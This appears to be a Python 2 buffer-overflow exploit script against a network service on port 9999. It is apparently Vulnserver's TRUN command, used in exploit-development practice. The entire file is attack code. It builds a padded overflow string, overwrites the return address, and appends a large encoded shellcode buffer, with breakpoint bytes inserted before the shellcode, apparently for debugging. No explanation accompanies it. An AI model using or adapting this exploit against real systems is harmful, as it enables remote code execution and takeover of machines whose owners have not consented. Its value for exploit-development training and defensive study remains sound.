#!/usr/bin/python
import socket
server = '10.121.0.46'
sport = 9999

buf =  ""
buf += "\xdb\xc8\xbf\x66\x8c\x30\x94\xd9\x74\x24\xf4\x5a\x31"
buf += "\xc9\xb1\x61\x31\x7a\x1a\x83\xc2\x04\x03\x7a\x16\xe2"
buf += "\x93\x37\x66\x1c\xae\x66\x5d\xd4\x89\x03\x45\x11\x73"
buf += "\xc5\x4c\x68\xd8\x24\x15\x99\x5d\xac\x55\x9e\x6d\xb7"
buf += "\xb1\x7a\x65\x1e\xdf\x6c\x05\x6c\x7b\x0d\x11\xf8\xeb"
buf += "\x64\x1e\x1c\xe5\xad\x04\x43\xfb\x83\xac\x13\x0f\x72"
buf += "\xf0\xd4\xdc\xc8\xb2\xf7\x1a\x03\x36\x51\x83\xe3\x49"
buf += "\x72\x4c\x2d\x7d\x91\x4e\x2b\xf0\x5c\x65\xff\xb3\xda"
buf += "\xa1\xb0\x03\xba\x4f\x4a\x4b\x7b\xe7\xe2\x1f\xd9\xdc"
buf += "\x0b\x7a\xa5\x87\x5b\xe7\xa0\x25\xf1\xd3\x95\x9f\x49"
buf += "\x05\x49\x0b\xee\x01\x5e\x16\x2b\x4b\xb1\x9e\x36\x9c"
buf += "\xbc\x95\x4d\x8f\xac\x83\x19\xe1\xa2\x35\x40\xa6\x51"
buf += "\x10\x87\xc1\x17\xae\x53\x07\x70\x73\x78\x24\x32\x0e"
buf += "\xeb\x51\x4b\x13\x36\x0d\x3b\x63\x10\xf0\xe8\x61\x2d"
buf += "\x49\xac\xf3\xd6\x06\xce\x93\x36\xdf\x14\xdf\x5a\xa0"
buf += "\xdb\xfe\x6a\x98\xb6\x17\xb1\xfe\x80\x7e\x30\xaa\xca"
buf += "\x56\x3f\x0b\x26\x94\x7f\xed\x6b\x71\x26\x3e\xbc\x48"
buf += "\x99\xa8\x1f\x95\xb0\x2b\x27\x73\xf5\xf5\x44\x15\x68"
buf += "\x13\xc8\xa9\x02\xbc\x65\x56\x90\xdc\x91\x77\xeb\x60"
buf += "\x54\x8a\x9b\xed\x32\xc9\x68\x39\x6b\x99\xe6\x49\x0d"
buf += "\x69\x83\x8d\x7d\x4f\x5c\x29\xc0\x20\xce\x35\x38\x3c"
buf += "\x16\x39\xff\x5f\xc2\xa5\xab\x56\x9d\xd3\xfa\x50\xe4"
buf += "\x57\x10\x6c\xce\x8c\x3b\xa3\xd0\x02\x23\x32\xfb\xd1"
buf += "\xe6\x06\x37\x2f\x13\x7e\x93\x62\x19\x08\x42\xa4\x8e"
buf += "\x03\x13\x21\xe7\xa2\x29\xd8\x3e\xbd\x7d\xad\x8c\x2f"
buf += "\xb0\x86\xc1\xe4\x7f\xf3\x2a\x16\x4e\x7a\x54\xcd\xf6"
buf += "\x7b\xc0\x04\x41\xf1\xf9\x19\x11\x9a\x1b\xa3\x02\x5f"
buf += "\x46\xac\x5c\x2e\x23\x2b\x25\xe4\xef\x37\x03\x15\xb2"
buf += "\xd7\x18\xaf\x96\xda\xa5\x6c\x20\x81\xc0\x91\x6a\x32"
buf += "\x0a\x65\x14\x1f\x3f\xb6\xad\x6b\x74\x0f\x8d\xd2\xc9"
buf += "\x8a\xb3\xc5\x10\x78\xa7\x01\xf3\xd4\x03\xaa\x90\x47"
buf += "\x2f\xca\x30\xf2\xc2\xcc\x60\xdd\x13\xc8\xcf"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

print ('Commands: STATS, RTIME, LTIME, SRUN, ' +
   'TRUN, GMON, GDOG, KSTET, GTER, HTER, LTER, KSTAN')
print

cmd='TRUN .' 


eip = '\xaf\x11\x50\x62'
np = '\x90\x90\x90\x90'
interrupt = '\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC'
print "Sending attack to ", cmd, " A * "
attack = 'A'*2001+'1111'+eip+interrupt+buf
s.send((cmd + ' ' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
